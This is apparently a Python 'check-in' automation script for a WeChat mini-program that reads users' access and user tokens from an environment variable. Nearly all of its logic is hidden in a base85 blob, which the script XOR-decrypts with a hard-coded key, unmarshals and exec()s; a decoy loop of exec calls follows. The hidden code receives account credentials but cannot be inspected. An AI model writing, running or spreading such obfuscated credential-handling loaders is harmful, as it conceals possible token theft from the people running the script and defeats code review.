# 大大鸣 小程序 绿蜜蜂 
#环境变量 dadaming_lmf=access_token&user_token
# 多账户#
# -*- coding: utf-8 -*-
import base64
import marshal
import hashlib
import random
import os
import sys

def decrypt(encoded, key):
    """解密并执行代码"""
    try:

        checksum = hashlib.sha256(encoded.encode()).hexdigest()[:16]
        if checksum != "7da84d6d807cdb43":
            print("Checksum verification failed")
            return None
            

        encrypted = base64.b85decode(encoded)

        key_bytes = key.encode()
        decrypted = bytes(b ^ key_bytes[idx % len(key_bytes)] for idx, b in enumerate(encrypted))

        code_obj = marshal.loads(decrypted)
        return code_obj
    except Exception as e:
        print("Decryption error:", str(e))
        return None


encrypted_code = "msWUIP<c>CSw&h!RBudDH*ivNWrS!^IAi)o4ox$75LX;jJa`I5Jw!f7IBOPAQ*kzM33MD&Tw)1C21zq~5LX;kJbXPu13+6vFlZ=NTXsKnKX6A-TxRJ;Fhvc1@Kz#UG=4QiGf!GYRB237H*h3!7eYi(U1tYPYE5Z)bXIs)G;uXVGf!GYRB237H*hv}e0N4rIAd)_YE932bXL<;P<c>CSw&h!4rNYKQhhdiXLloBU2n@rYE8m<bXIs)P<c>C!bLt$$!h9TH*ooLWp_qUIAd)_YfT4r6ILQxQh7B>Jx=^YRB7i^H*ivNWp_qUIb#V*?oBgy5k?$aJ9|(^Sw$#cR%t0(k#JIS&UZ#oIAd)_YE5W(5n4P}4R#7vTSY%gF?i}zH*ooLWp_qUIAd)_Yfa^L5L7ExG<yR_a7!<0RB22xMISs!MMidT07FM+Ky5=<RCZW6H4bnBH#2f#v(odrtL(b&=aB2}-Rs?9Lw108bXIs6d3cIXJtQt5AOImZ9&w0!Fa#qac?1Y39xiEkbXIs)P<c>CSw&ezRB2CAH*ld^Wp_r$I0tMyYB^|lbXIs)P<c>CSvgwcRcTE5HgHmMWp_qUIAU!gY947(b{GvtT6s`Sd1ZQKbV+P-()Hh((bS{!h=ujYP)B1tFdLrV(461ay#3jt&h4t(x0cTPjl#mVg7b^e?Wxkvo9gtj_V~8y`=R0fu+-VNvfQ@L@{-Bt+vDu6?dOcr=CZ}bxW>z`_{qNh?~U=t(#`Of+4!N#yo=E4g7DOv^w*u)!JO#Cy2aRKUM&b8(%<Wr-pr!yt%~~SgYWU4($t*p-I3(jvGMt;=;f*2vX<H2fy%(NfbN9f`l-|Qlfuce>%z49%&p$vvi0D*qv^Wc%982q(B#>n@X3wC&$7kCw)D@U{q(%e!jHkt(%#`*MV`^*-tEYu*Yb|++`jzGw&nbw!@<7(?~U=t(B%4*?ZBz*w1(lsjK;;B$<Unc-H^%Gz5mpp@6)UKye0x6ga6RAq|1xh`l-|7ocHvy=)<`9#Guv4vGVb^nZ|vW`NyN&f`#7GkMrW5{J@{h=$zH`zxL0q^X;q1vzF2KfbsLRfarz!@ukT0km}g5!ql_J+fN<=8I0rW)5_eH@y4M2oQBcUg81H_?$Vs?>z(b=u;0p}^XRJKvzG4tga6RAz14~R{HXc%lE~z+_WQK|)UEE?yxs477nStzgX!9|gV>4t|ET2ckn8oZ*zdIe^P%AXyvOLakIK5;z@F#n-}u9!@X3Mv?y%(gwf6t7+W5Tl-Hhkn)6VCW@7SZ&j)m~WkHx^3$l9IW$(-ubyvop{!{4RSt(VQ$fX?u?xATek@ukz#knP33|M<4w*Q(~pvf#|LtNFC==AY@&-uvUJ*1?bP<+8*2waM0^#qGS&;*7-N-`@6`%J!hfzlYZFkKN~;{PvO0^q$NAyuj(L(DSO!n_hBwfz181h4zX4&#BVGkn8QR#=y1v)}zJXv-QWcn$)|~+>qV=-}&jH(D#q<;<4l6w)gd+(bKci;E%%h)6MOb@!zihor=u=jn>DX?$Vs?>z(b=vBAKj$i=J3vy|`6g5&PExaNe#*QnF%knQZT>;Jjm+^zNgvc%}Ol)$v=>y*aQGHHw2#;Mc7lHd5V-{`gf+M>Y0vf#|LtNFC#;*<U6+}q%z_T`N9@v!syw8Yk<;mEVx#Etgc7n#MtjK=zZ-R8lf*4m8s!*-wh*_`S0yvpjJ+xV&Kv{1DB<&w$4-P`V=@X3$y^swaLw(r-Y;`6`Q(~b1s)5`Ug@#v%6y@lrLj_~iC%-fOAz@6&Jd85wryxsME-~Q#7?cQd$mFk80_p93NoayDh_x-r$)uH15yVbzAtkAUI!IS*=-}myN(Cv=G!+DVD&7b4avE<gF?9;3NzLmoKgX!9}rR0jz+o{#qlEl@%(EPT}*`w3?vf{~d)6LGB<?^EFwTs!=j`q@=$-|K1^PTJbQ%}6i)QrQ!(#X-3|MR2Py@td8j`r-F%FUho_MPeHw)xhg^60Anm6yiafz8OZz14~R{Hp!Xo!0ER?De+A@u20vy~y{stJt>6?w|YZ-Sgw2@X1?Dk>>ZX$IrFF+@ayiyvOaendh|b-;vJ7-s<L{_V<mz*|XN#wfy*^(dDz;@QwHP)5zGD<MN~aflZ12&#KS)knG>F#OAfn@S?%bz54RKi}6@CAv&V(rG)t3gV*Ms<KUjn<e$X;zs=08^~|Z)vX=kWfbz?@jKGNH+N<&Qlg#|E&HA;^@TS_wu+hx4pw_m}+K|%t-s}6L&cKZD!m`59w8HD7<j}p|?2O6b-}K0o`P-n_t}qTX13ev))$gCp{+`OivEtsK-0-9ByOrAOjnKfffZ2=0!l>TLlGxp|-|n{R{h;5-yxs4&l)$v=>se;Cp5cqc!l}{qk;e3})b_vo)vfjNy};nMkNUUz#h%~v-s<h5(ddrj%(MOFw(r-Y;`2~X6970mLK0|r4FfVDOIbo`4I~{90W?-MKNNp{VQ?2LIu2taTN_wXMOS9Bt@n@9`mg-xmc!_@#p$xr$*0fNw*1_%qTsOS^_A1W+V=gV|J{r2<h1R^vh2X6%+<Ki#EaR&)#bvF@aLq(sDb#_h}ij>;l`T7z?;R_yU@y~!TGMor;^9whvL?<t@Dr5`mg-xmc!_@#p$xr$*0fNw*1_%qTsOS^_A1W+V=gV|J{r2<h1R^vh2rAd1ZQKw*1|47f^CiMOS8U7(-2FN^MD4RCZW)a9MC?d1ZQKbV+P-7f^CiMOS8U7(-2FO0WFses)-PaGS-}d1ZR1!r`vOzmmlIhvCk$uIrD`;%!Nq;@+CT*qg@ByVKIA!r`vOzff|J^Z%sAuz~x|N^MD4mca0|#__Vz(PesNbV+P-7f^CiMOS8U7=ifLU~NfQRJ85Ka9MDr&&{~g+(~S5)#loe^Z#bDuIrD`;%!M-mca0|#_@2a&&{~g+>6@U)#ln#MU~Ll+V$n6{Kbpz{B~G&a9MC?d1ZQKbV+P-7m~;0Z&zk;7=ifLN^MD+;@+CT*jaFAyVKIA!r^SNq4==m?N?@S+V$n6{KZL{;@+CT*jcjC(WlJKw*SPiq4;u;^Z%sAutQB|N^MD4RCZW)a9MC?d8g0RUP)|n7m~;0MOS9BuIrD`;%!M-mca0|#_@2a&&{~g+(~S5)#loe^Z#bDuIrD`;%!Nq;@+CT*jaF;&&{~g+(~S57f^CiMOS8U7(-2FO0WFses)-PaGS-}d1ZR1!r`vOzmmlIhvCk$uIrD`;%!Nq;@+CT*qg@ByVKIA!r`vOzff|J^Z%sAutQB|N^MD+;@+CT*jaFAd1ZQKbV+P-7f^CiMU~URGDA&fO0WFsRCZW)a9MC?d1ZQKbV+P-7f^CiMOS8U7(-2FN^MD4RCZW)a9MC?d1ZQKbV;tqrh0NxMOUQ7sY6X>N^OqA%f95wxaHEI^!vZf<VkFD7f^CiMOS8U7(-2FN^MD4RJ85KT3K*sd8g0RbV+P-7c(Fi1Op>97y%S!kLk{x(D9M(^I3go4|H^OdRc687f^CiMOS8U7(-2FO0WFses)-PaGS-}d1ZQKbb-yr(8KAJ^UkB}w^>avP&Eb=6){S0W=d#xV0?OIbV+P-7f^CiMOS8U7(<WK`$tJwRCb!f!C7!;d1b%h^Ni^A-pKKm-_xMwxrEc=h4J%AL}X2FV?kzeYGrz5bV+P-7f^CiMOS8U7(<WK`$tJwRCb!f%A3X4yU@y~!TGMor;^9whvL?<t@Dr5`mg-xmc!_@#p$xr$*0fNw*1_%qTsOS^_A1W+V=gV|J{r2<h1R^vh2X6%+<Ki#EaR&)#bvF@aLq(sDb#_h}ij>;l`T7z?;R_yU@y~!TGMor;^9whvL?<t@Dr5`mg-xmc!_@#p$xr$*0fNw*1_%qU~5xMOS8dIk{*y7$gS_U00$|G8jH7JU1ysRB23d&3JAB5d|+kUtPCK8b1IQ00|m5J{L7LD@<BNRANk0Hv>p=Wp~C<$YF6vV$Cm&PF8(f*k92K-3ZzU)FjLw#Bfq_WfVqGIAd)_YE5Z)bXIy+P<c~FSw*R7RB24bHw061Wp_qUIAd)_YU^oubp3c%P<c>CSw&hnR257(HgHmMWp_qUI52H*YdC*+bXK3j&!5=Wu;10A$kQ1iQUZT70um@B5n&%fYE5aPawHizG!{K>Sf5ZZCk#FfRu?xM5d=q2IAcvTVohmyu15+tJ{><Q1~4fgCN?cKQXVD%Yj;La6Ju>g8Chv~bk=yYL1V#O&0g9MjAB`aJZyq?c?C>RIAga;4lE5B89x>=4;4KjqeOWyL1|1<($w{r!O*Yhn}*`ojl<cV_WqvA*$hHQSw+76{*L$U-|Wts`Sq^ko`&M_A9ZPXbhF&?wcYow;pV@}#g4+_(enC~*VdrSv5M%+jqt~x`uUyo)12Smu)@`7Y7H$mRvkMW0w^jyUI1)HYE5Z)bXIs)P<dHLSw&ezRB68$GH_DmWeY~|IAd)_YE5Z)bXIs)P<c>CSw&h!R1Hn^HgHneWOqhTIAd)_YA|RFcUE{-P<c>CSw&hoRnJXQH``NkWp_qUIAd)hXeMfSbXIsIMGaL)Sw&h!RB237HxyA0W$Z>YJpOLrYfWj>byj#*P<c>CSwvbPQ94X6HWXBAWp_qUIAd)_YA|aAbuxcXP<c>CSw&h!R1{A(KMhtEY!gg5IUZ;)YAIqIc*S`#T^(N3SRqw8R{BjgCj?b;Wp_qUIAd)_YU^oubp3c%P<c>CSw&jbRSjJ>CF4^Tb`w&=IR|(;Y2IiYVlsBcQ5{DkLDpL#O$}DTHWWz~dE`elB?oiWYbkadRK<BRaUF8hSRr{KaQaO)5)^ddWD{XD5b$g}Y(!}ceO7o@P<c>CSw&heQE5z4H*ivNWeY+qJ|Af6L+fgIbp3l)P<c>CSw&hnQx!|{F>q3HWp_qUIAd)_YE5Z)bXIs)P~T8TS?*dzRB237H*iu9Z39D4IAd)_YE5Z)bTU#RUwKeRSw&h!RB22&KX6iVWp_qUIK^#7YUXKpbXIs)P<c@2P(@lrRB237H*ivNWp_qUIAd)_YAHhAbyj%&QF%~DSw&h!RPs#EHP%ydW!y(lIAd)_YE5Z*bSiN6Re4ZHSw&h!RB237H*ivNWp_qUI0r%CYfWj>byj#*P<c>CSs`66R%uL9H{eqMdJ9hQJ!5S~YE5Z)bXIs)P<c>CSw&h!R1IM}H`Y*cW!ywiIAd)_YE5YceJXMGRe4ZHSw&h!RB237H*ivNWp_qUI0r)_Wb12qbp3i(P<c>CSw&hnUKK_1GH_CIWp_qUIAd)_YE5Z)bXIs)P#u3GU*lLsRKiYDH*ivNWp_p`GaqE;Z%t`<bXIs)P<c>CSw&h!RB237HxyzPYtckdILL2CYE5Z)bXIsPTm@O@Tt!+%RB237H*ivNWp_qUIAd)_YAIM8a`1XqP|{LISw&h!RB22vIt*LVV0T7PIAd)_YE5Z)bXIs)P<c>CSs`d4OwUeIH``EhWp_qUIAd))WHDnLM?HF0P<c=_Au(S?RB237H*ivNWfO8NItN%HYRGG0bXIs)P<c>CS>9S9V)Re+HgHneWOqhTIAd)_YD{SiaaMR%P<c>CSw&hQV--iqHxz2`X3<AbILK^9YE5Z)bXIs*Pz78gU@lliRB22gBLr7+Wp_qUIAd)_YAI6$dd+w;YvfbmSVdayRcTC8H*ivNWp+kB79U|ERwiqBbXIsILk(3&Sw&h!RB237HxzFUXzWJKI>l^8YUXHobXIs)P<c>BSu0O5QE5z4H*ivNWp_q20v}`DYAII)dChpsRNqlYS?*g!RB237H*ivOWfOS=I2UL}YE5Z)bXIs)P#t7DTOn^DRP0VmH*ivNWp_qUIQVTMD$r`)byj%&QF%~DSw&h!RA@{#2qRJkV0T7PIAd)_YE5YzKq`7NWgSq$TU=U2RB237H*iwvWfKQ1FvDm@YE5Z)bXIs)P<c>CSw&h!RB22$brccQXLm;XI%91{YE5Z)bj^6nRNqlYS?*g!RB237H*ivOWfMaKI6!SOeobk3bXIs)P<c>eSvPMuTOCPKH*ivNWp_qUI0soeXenGAbkllIP<c>CSw&h!RPszVa|A_lWp_qUIAd)_YB6Tsbyj%&QF%~DSw&h!RPs#EGuBgbW!y(lIAd)_YE5Z*bPsqkPy}B&Rv}*&R1HioI1XI}WB^7eJ34JKYh)}oj#pm4Qh88EEKyoTRDt;P(*Na@#ml4Yw~G1Sg5t(PR3lYZP<g-m)uZ?3v&iDKm&~`$>XQ7#+}qb?3oZ&B2PIV^KN2-5889gzCPX+rTopVt7j;HZIErjWYE2VR93l)RBSU{^H7Go5I3FQ9Q6GE}3L0rKND4x84lW2yLpL5bV@_!zgG4u<QXL}!UKc#5Z!{@BRt63-10n|kemxyCAXG6cFf%`&R|O(9?Qkf51QaDTOAtUZ1tts@4qPoIH4A+PJ|HwPE@clrSp+v65n2){NCp>Y3q2VW9W@yuITk)>A!sc!BSb1aMIC<!7aJo!TMP*!4wqp712Y;4C=nu^SacvyAsQ(l8U#HV02!Q9R00`1W;p>72YU-XKM8#<J)c{3j&3?PMFTq>3k^Uf2~AyST9<D*7d0IwBm+}zc5fg{2MjNNaTO*J4O$gBOa>QB2|or42YU-YBpfP93LrUX5)3#oUtJ#^0TP^4TMQpH5JNg07kfT4BpNts9Uv(&j%+DEM+7UVVkILsT@eU05Dftg0457;e^w(RD>E}DF&-%~UlAr;1{f=UPa9hx2`LOrKwwI5W*upAVSROXY+GX@Ru?y40|h5NT}=ft2O$%8H8mSEAPs#2HzqY9JqIf&CKo6h6<cOBT?GLr9w<dv79;{$5gIchDKU2mH3usvRu?x2YYi@ado4jc0(KZhM0i1eQlnQdJS09KCK{GhM-d<s2m~`;IAd+0$McNv#IWz+x$fkBc|S{F4Mb@_8dWw@KtFtSby-Liut^FR5Hq4uG#Df%gF-Vl3mPRgS*lq93=k*}Q4KO83pBHH051qL4+}LgI5$3@SPm&BXc;^P01z}WRJmgz4>>jp5i%zxF&aA}EuUFDF&a5lH*iv#(b1#dk3$5!m9mx%dscW>YFW4H=b+N{vf<pfz3+1eYj;La(A@K((cq5N%Cqq1YFQ;jSw&i)@W7T|cpg3rHxeQMSpWtj9yn)sbXJhq=bY})zW?~3*z9(4LUU4bWs<|w;%_1-1~ecR05cyXF%>0ASw&i{+TN+`pqKUCfd9a17#3hgYE6v&_j*{d_tv$~-+y`$A$UwuH%fAr-u<A*orc=<jo{av{N@ctP<c>&d7}6GvElr;lfk;iz)fa~I}RQpA3<q&bg<<7x90V(&D^r;`y5<SH*jcDg4+1Cu+xb8=%~@aPIggRihLtCH7qWlR|P3NMRrnhWd%r3IAga?7$_JG5hV;Iih4I9EuUU5Ck7%QG;mUKzjP=+Pq}3^9zPEZ9XlP2Sv)8tJT)#XI|r6gL<AsPb*(`$TL1zx1Ua*Q067ygJ_?FUI3_tDCmItbSQ|GSzkM?!T@f-e1tts@u2l^rJPUM3Sw$#jRB23zKLR%a6&NTZUAb#C4?Y|e0E}@ZIUYV3JtQt9j$%JMP#z5d5f(BfOSxn<11bk65H|rOigF?%E+i-+3mr8gQmR@T3j-rJN&*3#U_T5TD<&B=I~*jPSRg4?RB23d7f^CiMOS8U7(-2FN^MCBd{%f?ihUz4J}W2!RB23VH*it`{B%Z8xMPh=e!?{JDb7oWU1o$zM#UVMQ)9$rwhPt?^%j&@FSBY<w?$;AdJWhCfOiX*S00K>54c1Q<9H6DZ7ZH%EbADic~tRP;BWXEh-gROSkXhp9+^Z^JVnwmm2pN{H0w3CX-{W<^bm+%LUvZ4QBle%q-tJWF_2n+?FF_~Dr{@EY)xQq>{^IXLUvZSQAJZwfq!d*Az6lGOovZGH)WknYD9jhY;A~LLUvZSRYg-)#45aBC4W?cYj;mYs0p1(ctUT8WL9xl*bAUmOG;d|MrlPwuXCbdcX&XcEMsI;`gNIYW?6owMtNCQ$zZBdMrKN)FK}CH{adz4Dr{@Ea7|!g>~M%pLUvZSMMYCw%uc*dC4W?cdv{Ml=x{i;bzf$Fgm!peN~ud}sbok>Qkia2K5Bw#PKRYeH)ZVsnq^9TVT)@`#6|E#@e<+_gn9^rBs7L$A^%Q@DSG-__)z#~;7RaMwQ*gSR|v;F$Q9Krs}6;2Q>9sE=u{_{bq2j>KZbT2fOj31Q45Yu8o5Lq*Ly?#U;TW*Ub1FezD9J|WrTBdfpT)6L0iR7&SUIkpF)FbOQT+Xuqw4&Nzz2(S^jb6VyH@SjbCidAF)((sC~$P#Txbj>3dp|a(dx0tV~<UedB%aRP`v7PE(jj4fq+Va#ztUsvgZ4+8nrVLxOK%*fEG+d)i0eNx5rfk7I*tSfgKUuqlm6aMcW|dv&N;bEH60iBlNmSiv6pWY__wMMjoJdb4{3x?3x$WEHGN6RAK1gjG+KLR{=C=VoW3b3&Fz4YGZ3zFl9aWMG&@PT7BzN_2`=WwcmJ=W1x$U#DDZ=y_L`aCf+DPl9Z1fNg7+O@4w<bjbpMB0_>^SE^D;=y_P~Qk`>6q)bhRL{EfMZ<S7SgnfFqBWZ$YE8l#8A}zgKB#j}cZWyRc9;ieJjZqbqKqjn3EZ`=Wbz+uAe8XYxIORIfCxTdKfNvC+PXUTk5V%|y<6sw}buykuBl8)fW?Z>y7S1&OLeWF-N|8orgnKT6B@*fc+70|F@J78CHJnx$plKL}LK}cpJCs%?fMqX&I}?gwedlwi-Dr8XYENu!gjRY}MTt;FTu_HiS-C<HuYB?##U$nf?0ZC(WDdD@H|tC8A;4z)Z<SOAgl7+fKQxAVA*W6h;B0x$AH^K-0p1PXC4s2Fp|xK}QGB$j&jWXIWp{)|eOM%AYK3}ZJ#~1VU`QEcS&Vs49!pP~8d?}{X1!ZgazSpKViGnL6+adU4^Tp#UK#}<I|>sGMM6??Wd(9jIAga&1wONS1~Up(P<c?DS0g(vF*Z3NQUWs-02wkOJY#J}7({7!bR>3GP<e_#JS!|LCI%uP2XInyzkeq)TMQT|9zGj>bXIsIVR=wTD*{?YRI@}4XdW{k04NzE0b^}O!%Z7<bXIsISb0!KqfKTgI}JHLQcfTvWp_qVIAd)!SxjkogjIQ0QK3+BiA8UvRA$Uww|~-oy?0H}Gvj8)VU=ld^k4X2&~S)HP{mWlUFk)NH*JD)c&A29=won}YEZd&X^wbufO&M6Sz(GraJfu&=Wup{V`)c1$YXOyc)e+6bwr33QF>8YsYO{tNtsMhHf^GQWph-(YWFvmX;Qg+YmRq8*bCf0!A8Ot$TQ?z<85W5YEP110OKW|Zba!lq+C1pbJ=s}G30mQdAUXr=Xw#MZ#0)we79)=x=Agla1xkVLHQV;T};{lgkuPUGc|^GAg4kV$Y&%+Ygn0hJy&@{pm`ZaSWv1HR%u9HzY2hHe5XZ8;AeftCd?=NI@UIhLt>yuSU^m*RA@;=zjumyY5zjlZ|Y#mXT@ajd8U6>RAYcdK($^(QGdKrHg!Y*Z+Ave"

key = "tVxVPyPGYEZETiLR7pRrewFP8cmFjMix"


code_obj = decrypt(encrypted_code, key)
if code_obj:
    exec(code_obj)
else:
    print("Decryption failed")


for i in range(100):
    var_name = f"_var_{i}"
    exec(f"{var_name} = os.urandom(32)")
